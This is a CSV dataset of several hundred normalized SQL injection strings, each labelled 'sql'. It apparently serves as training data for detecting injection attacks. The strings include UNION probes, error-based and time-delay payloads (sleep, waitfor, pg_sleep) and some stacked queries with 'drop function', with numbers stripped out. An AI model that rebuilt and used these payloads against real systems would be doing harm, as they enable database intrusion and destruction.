,language,source
2682,sql,". . . . / / / / ? = & = & = & = ' , ( select ( case when ( = ) then xcdfeecaffcdef else * ( select from information_schema . plugins ) end ) ) -- "
2683,sql,". . / ? = & = & = - "" ) union all select # "
2684,sql,". . . / ? = ) ) and = # "
2685,sql,". . . / / / ? = & = & = & = "" ) and make_set ( = , ) and ( " szkg " like " "
2686,sql,". . / ? = & = & = % ' and make_set ( = , ) and ' % ' = ' "
2687,sql,". . . . / / ? = - ) ) order by -- "
2688,sql,". . . . / / / ? = & = ' ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ' ajjp ' = ' "
2689,sql,". . . . ? = ' ) ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( ( ' oizm ' = ' "
2690,sql,". . . ? = "" order by # "
2691,sql,". . / / / ? = & = & = ) ) and = and ( ( = "
2692,sql,". . . . ? = & = & = & = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null # "
2693,sql,". . ? = ' union all select null , null , null , null , null , null , null , null , null , null -- "
2694,sql,". . . . / / ? = & = ) ) and = # "
2695,sql,". . / / / / ? = & = ' ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' wgym ' = ' "
2696,sql,". . / / ? = & = & = & = and = -- "
2697,sql,". . . ? = & = & = ' and = -- "
2698,sql,". . . / / / ? = & = & = - ' union all select , , , , # "
2699,sql,". . / ? = % ' ) union all select null , null , null , null , null , null , null , null , null , null # "
2700,sql,". . . . ? = & = & = & = ' ; waitfor delay ' : : ' --"
2701,sql,". . / / / ? = & = & = & = ' waitfor delay ' : : ' and ' hqfw ' like ' "
2702,sql,". . . . / ? = & = ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
2703,sql,". . . / / ? = % "" and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and " % " = " "
2704,sql,". . / / ? = & = & = & = % ' ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' % ' = ' "
2705,sql,". . . . / ? = & = & = & = ' ) ) order by -- "
2706,sql,". . . / ? = & = ( select ( case when ( = ) then else / ( select ) end ) ) "
2707,sql,". . . . / / / / ? = & = - "" union all select , , , , -- "
2708,sql,". . . / / ? = & = & = and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) -- "
2709,sql,". . ? = & = & = & = "" ) and = -- "
2710,sql,". . . / ? = ' ) ) union all select null , null , null , null , null , null , null , null -- "
2711,sql,". . . . / / ? = & = ' rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ' tmeq ' like ' "
2712,sql,". . ? = & = % ' ) union all select null , null -- "
2713,sql,". . / / / ? = & = & = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) # "
2714,sql,". . . / / ? = ' ) ) union all select null , null , null , null , null # "
2715,sql,". . . ? = ' ) ; select sleep ( ) and ( ' fxql ' like ' "
2716,sql,". . . / / / ? = and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) -- "
2717,sql,". . / / ? = & = & = & = , ( begin if ( = ) then dbms_lock . sleep ( ) ; else dbms_lock . sleep ( ) ; end if ; end ; ) "
2718,sql,". . / / / / ? = - union all select , , , , , , , , # "
2719,sql,". . . . / / / / ? = ) ) and = # "
2720,sql,". . . / / / / ? = & = ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) -- "
2721,sql,". . . / ? = & = & = - union all select , , , , # "
2722,sql,". . . . / / ? = & = & = ) ) ) union all select null , null , null , null , null -- "
2723,sql,". . . . / / / ? = - union all select , , , , , , , , -- "
2724,sql,". . / / / ? = & = ' ; ( select * from ( select ( sleep ( ) ) ) bcts ) # "
2725,sql,". . . . ? = & = and make_set ( = , ) "
2726,sql,". . / ? = & = & = & = - ' ) order by # "
2727,sql,". . . ? = ' ) ) and make_set ( = , ) and ( ( ' ijtf ' = ' "
2728,sql,". . . . / / / ? = & = & = "" and = and " phnm " like " "
2729,sql,". . . . ? = & = & = & = % ' and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ' % ' = ' "
2730,sql,". . / ? = union all select null , null , null , null , null # "
2731,sql,". . . / ? = "" union all select null , null , null , null # "
2732,sql,". . . / / ? = & = & = & = % ' procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ' % ' = ' "
2733,sql,". . . / / / ? = & = & = and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) # "
2734,sql,". . . . / / ? = & = & = ) and sleep ( ) -- "
2735,sql,". . . / / / ? = ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
2736,sql,". . / / / / ? = & = "" ) ) and = -- "
2737,sql,". . . / / ? = & = % "" and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and " % " = " "
2738,sql,". . . . / ? = & = % ' ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( ' % ' = ' "
2739,sql,". . / / / / ? = & = & = & = % "" union all select null , null , null -- "
2740,sql,". . / ? = & = & = & = - ' union all select , , -- "
2741,sql,". . . . / / / ? = & = & = & = % "" ; if ( = ) select else drop function rpwm --"
2742,sql,". . ? = & = & = & = - "" ) union all select , , , -- "
2743,sql,". . . . / / / / ? = & = & = ' ) ) and = # "
2744,sql,". . . ? = - ' ) ) order by # "
2745,sql,". . . / ? = "" ) and = -- "
2746,sql,". . / ? = & = & = & = ' ) ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ( ' cldo ' = ' "
2747,sql,". . / / / ? = & = & = ' and sleep ( ) and ' mfhr ' = ' "
2748,sql,". . . / ? = and = -- "
2749,sql,". . . . ? = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' dcwr ' = ' "
2750,sql,". . . . / / ? = ) ) ) and sleep ( ) and ( ( ( = "
2751,sql,". . . / / / ? = & = & = ' ; select sleep ( ) and ' dhom ' like ' "
2752,sql,". . . / / / / ? = & = % ' rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and ' % ' = ' "
2753,sql,". . . / / / ? = % ' union all select null -- "
2754,sql,". . / ? = - "" ) union all select # "
2755,sql,". . . . ? = & = & = & = - ' union all select , , , , , -- "
2756,sql,". . . / / ? = % "" and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and " % " = " "
2757,sql,". . . . / / / / ? = % ' ) ) and = -- "
2758,sql,". . . . / / / ? = "" ; waitfor delay ' : : ' --"
2759,sql,". . . . / / / ? = & = % "" and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and " % " = " "
2760,sql,". . / / / / ? = & = & = ) ) ; waitfor delay ' : : ' --"
2761,sql,". . . / ? = & = & = & = ' ) union all select null , null # "
2762,sql,". . / / / / ? = & = & = & = - ) union all select # "
2763,sql,". . / ? = & = & = ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) "
2764,sql,". . . . / / / ? = & = & = ' ) ) union all select null , null , null , null , null , null , null -- "
2765,sql,". . . . ? = and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is "
2766,sql,". . . / / / / ? = & = & = ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) -- "
2767,sql,". . / ? = & = & = % ' ) and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and ( ' % ' = ' "
2768,sql,". . ? = & = & = & = "" union all select null , null , null , null , null , null -- "
2769,sql,". . . . / ? = & = & = & = ' union all select null , null -- "
2770,sql,". . ? = & = ' union all select null , null , null , null , null , null , null , null , null -- "
2771,sql,". . / / / ? = % ' ) and = # "
2772,sql,". . . . / ? = & = ' and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) -- "
2773,sql,". . . . ? = & = ) ) and = -- "
2774,sql,". . . / ? = % "" rlike ( select ( case when ( = ) then else x end ) ) and " % " = " "
2775,sql,". . . . ? = & = & = "" and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and " cuhl " = " "
2776,sql,". . / / / ? = & = & = ) ) ) union all select null , null # "
2777,sql,". . . . ? = & = ; select sleep ( ) # "
2778,sql,". . ? = ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( = "
2779,sql,". . ? = & = & = & = ) ) ) and = # "
2780,sql,". . . / ? = & = & = "" ) ; waitfor delay ' : : ' --"
2781,sql,". . / / / ? = - % ' ) union all select , , -- "
2782,sql,". . / / / / ? = - "" union all select , , , , , , , , , # "
2783,sql,". . ? = % "" and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and " % " = " "
2784,sql,". . . . / ? = & = & = & = "" ) ) and = -- "
2785,sql,". . . . / ? = & = & = ) ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ( = "
2786,sql,". . / / / / ? = & = - ) ) order by -- "
2787,sql,". . ? = & = & = ) and sleep ( ) and ( = "
2788,sql,". . . / ? = & = & = ) rlike ( select * from ( select ( sleep ( ) ) ) irzi ) and ( = "
2789,sql,". . . / / ? = - ) ) union all select , , # "
2790,sql,". . . / ? = & = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' avnt ' like ' "
2791,sql,". . / ? = & = & = & = ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( = "
2792,sql,". . . . / ? = & = - ' union all select , , , , -- "
2793,sql,". . / / ? = & = - ' ) ) union all select , , , , , , , , # "
2794,sql,". . / / / / ? = & = & = & = ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( = "
2795,sql,". . . / ? = & = ' ) ) ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ( ( ' dtvs ' = ' "
2796,sql,". . . . ? = & = & = & = , ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) "
2797,sql,". . . / ? = - ' order by -- "
2798,sql,". . ? = , ( select ( case when ( = ) then else * ( select union all select ) end ) ) "
2799,sql,". . . ? = & = ) union all select null , null , null , null , null , null , null , null -- "
2800,sql,". . / / ? = & = & = % ' ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ' % ' = ' "
2801,sql,". . / / / ? = & = & = & = % ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' % ' = ' "
2802,sql,". . . . ? = "" ) ) and make_set ( = , ) and ( ( " qarm " = " "
2803,sql,". . . / / / ? = % ' ) ) union all select null , null , null # "
2804,sql,". . . ? = & = & = ' ) ) union all select null , null , null , null , null , null , null , null , null # "
2805,sql,". . . ? = & = & = & = ; waitfor delay ' : : ' --"
2806,sql,". . . . / / ? = ' union all select null , null , null , null # "
2807,sql,". . . . / / ? = & = & = & = - ) ) union all select # "
2808,sql,". . . / / / ? = & = "" ) ; select ( case when ( = ) then else / ( select ) end ) --"
2809,sql,". . . / ? = & = ' ) and = ( select from pg_sleep ( ) ) and ( ' kmuo ' like ' "
2810,sql,". . ? = % "" union all select null , null , null , null , null # "
2811,sql,". . . . ? = - ' ) ) union all select , , , , , , , , , -- "
2812,sql,". . . . / / ? = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' danm ' = ' "
2813,sql,". . . / ? = ) ) ) order by -- "
2814,sql,". . . / / ? = & = ) ) rlike ( select ( case when ( = ) then else x end ) ) and ( ( = "
2815,sql,". . / / ? = ' ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and ( ' nuvc ' = ' "
2816,sql,". . . . / ? = & = & = - "" ) ) union all select , , , , , # "
2817,sql,". . . / / ? = & = "" ) order by # "
2818,sql,". . . . ? = & = % ' ) union all select null , null , null , null , null , null , null , null , null , null -- "
2819,sql,". . . / / / / ? = & = ' ) ) union all select null , null , null # "
2820,sql,". . . . / / ? = & = & = ' ) ) and elt ( = , sleep ( ) ) and ( ( ' mqdg ' like ' "
2821,sql,". . . / ? = & = rlike sleep ( ) # "
2822,sql,". . / ? = ' ) ) and make_set ( = , ) and ( ( ' zpwy ' like ' "
2823,sql,". . . . / / / / ? = - ' ) ) union all select , , -- "
2824,sql,". . ? = & = ) ) ) and = -- "
2825,sql,". . . . / ? = "" ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( " zbwb " = " "
2826,sql,". . . . / / ? = & = & = & = "" ) and make_set ( = , ) and ( " czky " like " "
2827,sql,". . ? = & = & = ( select ( case when ( = ) then else / ( select ) end ) ) "
2828,sql,". . . ? = & = & = ' and = and ' hmsf ' = ' "
2829,sql,". . . / / / / ? = & = & = & = "" ) order by -- "
2830,sql,". . . . ? = & = & = & = "" ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( " efcz " like " "
2831,sql,". . . . ? = % ' ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ' % ' = ' "
2832,sql,". . / / / ? = procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
2833,sql,". . / / / ? = & = & = & = ' ) union all select null , null -- "
2834,sql,". . . . / / ? = & = & = & = - ' ) ) union all select , # "
2835,sql,". . . . / ? = & = & = & = ' ) ) ; if ( = ) select else drop function slbb --"
2836,sql,". . . / / / ? = & = union all select null , null , null , null , null , null , null , null , null , null # "
2837,sql,". . . / / ? = & = & = & = ' and = -- "
2838,sql,". . . / / / / ? = & = % ' and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ' % ' = ' "
2839,sql,". . . / / ? = & = ) ) and ( select * from ( select ( sleep ( ) ) ) zhty ) and ( ( = "
2840,sql,". . . / / ? = & = & = "" rlike sleep ( ) and " iyxu " = " "
2841,sql,". . . ? = "" ) union all select null , null , null , null , null , null , null , null , null # "
2842,sql,". . / / / / ? = & = & = & = % ' ) ; waitfor delay ' : : ' --"
2843,sql,". . . . / / ? = & = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ' swfv ' like ' "
2844,sql,". . / / / ? = & = & = & = ' and = and ' hmsf ' = ' "
2845,sql,". . . . / / / ? = & = & = "" and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and " zwgm " = " "
2846,sql,". . . . / / ? = "" ) order by -- "
2847,sql,". . / ? = & = ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) "
2848,sql,". . / / / / ? = - ) ) ) union all select , , , , , -- "
2849,sql,". . / ? = & = & = & = ' ) union all select null , null -- "
2850,sql,". . . . / / / / ? = "" and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and " lrdu " like " "
2851,sql,". . . . / / / / ? = & = & = & = - ) ) ) union all select , , , , # "
2852,sql,". . . / / / / ? = & = & = & = % ' ) ; if ( = ) select else drop function tqqk --"
2853,sql,". . / / ? = & = & = ' ) ; select sleep ( ) and ( ' lmsu ' = ' "
2854,sql,". . . . / / ? = & = - union all select , , , -- "
2855,sql,". . / / ? = & = & = "" union all select null , null -- "
2856,sql,". . . . ? = - "" union all select , # "
2857,sql,". . . . / ? = & = % ' ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( ' % ' = ' "
2858,sql,". . . / / ? = & = & = & = % ' ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ' % ' = ' "
2859,sql,". . . ? = "" ) ; select sleep ( ) and ( " xzdz " = " "
2860,sql,". . / / / ? = & = & = ' and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ' isyl ' like ' "
2861,sql,". . / ? = & = & = & = % ' and = % "
2862,sql,". . . / / / ? = "" ) ; select ( case when ( = ) then else / ( select ) end ) --"
2863,sql,". . . . ? = & = & = ' ) ; select sleep ( ) # "
2864,sql,". . ? = & = and = -- "
2865,sql,". . / / / ? = & = & = union all select null , null , null , null , null , null , null -- "
2866,sql,". . . ? = and = ( select from pg_sleep ( ) ) "
2867,sql,". . . / ? = union all select null , null , null , null , null , null , null , null , null , null # "
2868,sql,". . . / ? = & = & = - union all select , , , , , # "
2869,sql,". . . / / ? = & = ' ) union all select null , null , null , null # "
2870,sql,". . . . ? = - union all select , , , , # "
2871,sql,". . / / ? = procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
2872,sql,". . . . ? = & = & = & = - union all select , , , , , , , , # "
2873,sql,". . / / / / ? = & = ' ) ) union all select null , null , null , null , null -- "
2874,sql,". . . / ? = & = ' ) ) ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( ( ( ' ppdu ' = ' "
2875,sql,". . . / / / ? = & = & = & = - ' union all select , # "
2876,sql,". . . . / / / ? = ' ) ) ) ; if ( = ) select else drop function rpwm --"
2877,sql,". . . . / / ? = & = & = & = ' ) ) and sleep ( ) and ( ( ' ewzk ' like ' "
2878,sql,". . . / ? = & = ' ) ) union all select null # "
2879,sql,". . / / / / ? = & = ) ) and sleep ( ) and ( ( = "
2880,sql,". . . . / ? = & = "" ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( " cllf " like " "
2881,sql,". . . . / / / / ? = & = union all select null , null , null , null , null , null , null , null -- "
2882,sql,". . . . / / / / ? = & = & = & = % "" rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and " % " = " "
2883,sql,". . . ? = - ' union all select , , , , , , , , , # "
2884,sql,". . ? = - "" ) union all select , , -- "
2885,sql,". . / / / / ? = & = ' ; if ( = ) select else drop function usew --"
2886,sql,". . . . / ? = & = & = & = ' ) ) ) ; if ( = ) select else drop function uuex --"
2887,sql,". . / / / ? = & = ' ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ' ixoy ' like ' "
2888,sql,". . . / / / ? = & = & = & = - ) ) union all select , # "
2889,sql,". . . . ? = & = & = & = ' and elt ( = , sleep ( ) ) and ' lygj ' = ' "
2890,sql,". . / / / ? = & = & = & = % ' union all select null -- "
2891,sql,". . / / / ? = & = & = & = ' ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ' frgc ' like ' "
2892,sql,". . / / / / ? = & = & = & = - ) ) union all select , , , , # "
2893,sql,". . . . / / / ? = "" and = -- "
2894,sql,". . . . / ? = ' union all select null , null , null , null , null , null # "
2895,sql,". . . / / / / ? = & = ; select sleep ( ) # "
2896,sql,". . ? = & = & = "" ) and make_set ( = , ) and ( " pktx " = " "
2897,sql,". . / / / ? = - ' union all select , , , , , , , -- "
2898,sql,". . . . / / ? = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ' uroo ' = ' "
2899,sql,". . / / / / ? = & = & = ' ) ) order by # "
2900,sql,". . / / ? = & = & = ' ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( ' rjqq ' = ' "
2901,sql,". . / / / / ? = & = "" union all select null , null , null , null , null , null , null , null , null # "
2902,sql,". . . . / / / ? = & = & = & = ' ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ' zrkf ' = ' "
2903,sql,". . . . / / ? = - "" ) ) union all select , -- "
2904,sql,". . / / / / ? = & = & = and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) # "
2905,sql,". . . . / / ? = & = & = & = - ' union all select , , , , , , , , # "
2906,sql,". . . / ? = & = & = & = "" and = and " rpbj " like " "
2907,sql,". . . . / ? = & = % ' and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ' % ' = ' "
2908,sql,". . . / / / / ? = & = % ' and = # "
2909,sql,". . / / / / ? = & = & = ' ) order by -- "
2910,sql,". . / / / ? = & = & = & = % ' ) ) and sleep ( ) and ( ( ' % ' = ' "
2911,sql,". . . . / ? = ' ) and = and ( ' qxff ' like ' "
2912,sql,". . . . / ? = & = & = - union all select , , , , , # "
2913,sql,". . . . / / ? = & = ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) -- "
2914,sql,". . . . / / ? = & = "" ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) # "
2915,sql,". . . / / ? = & = & = & = - ' union all select -- "
2916,sql,". . ? = % "" ; select pg_sleep ( ) --"
2917,sql,". . . . / / ? = & = & = - union all select , , , , , # "
2918,sql,". . / / ? = ' ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( ' zdws ' = ' "
2919,sql,". . / ? = & = ' ) ) ) union all select null , null , null , null , null , null , null , null , null # "
2920,sql,". . . . / / / / ? = & = & = & = "" ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( " ilch " like " "
2921,sql,". . ? = & = - % ' ) union all select # "
2922,sql,". . / / / / ? = & = ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( = "
2923,sql,". . / ? = & = & = ' ) ) ) ; if ( = ) select else drop function eilx --"
2924,sql,". . / / / / ? = & = ) union all select null , null , null , null , null , null , null , null , null , null # "
2925,sql,". . . . / ? = & = union all select null , null , null , null , null , null , null , null , null -- "
2926,sql,". . . / ? = % "" and ( select * from ( select ( sleep ( ) ) ) zhty ) and " % " = " "
2927,sql,". . . . / / / ? = & = & = - order by -- "
2928,sql,". . . . / ? = & = & = - union all select , , , -- "
2929,sql,". . / / / / ? = & = & = & = - % "" union all select , , , , # "
2930,sql,". . . . / / ? = & = & = and sleep ( ) -- "
2931,sql,". . . . / / ? = & = ( case when = then else null end ) "
2932,sql,". . . / ? = & = - "" ) union all select , , , , , # "
2933,sql,". . / / / / ? = & = & = & = "" ) and make_set ( = , ) and ( " cfwh " = " "
2934,sql,". . . . ? = & = & = % ' order by # "
2935,sql,". . . . / / / / ? = & = & = & = "" ) and = and ( " srsh " = " "
2936,sql,". . / / / ? = & = & = "" ) ; select pg_sleep ( ) --"
2937,sql,". . . ? = & = & = & = % ' ) ; if ( = ) select else drop function axtb --"
2938,sql,". . . / ? = & = & = ' ) ) order by # "
2939,sql,". . . ? = & = & = & = ' ) ) and make_set ( = , ) and ( ( ' meik ' = ' "
2940,sql,". . . . ? = & = "" ) ) ; ( select * from ( select ( sleep ( ) ) ) bcts ) # "
2941,sql,". . . . / / / ? = & = & = ( select ( case when ( = ) then else / ( select ) end ) ) "
2942,sql,". . . . ? = & = & = - ) ) ) union all select , , , # "
2943,sql,". . . . ? = & = - union all select , , , , , , , , , -- "
2944,sql,". . . . ? = & = & = & = ) rlike ( select ( case when ( = ) then else x end ) ) and ( = "
2945,sql,". . . / / ? = & = & = & = % ' ) ) and make_set ( = , ) and ( ( ' % ' = ' "
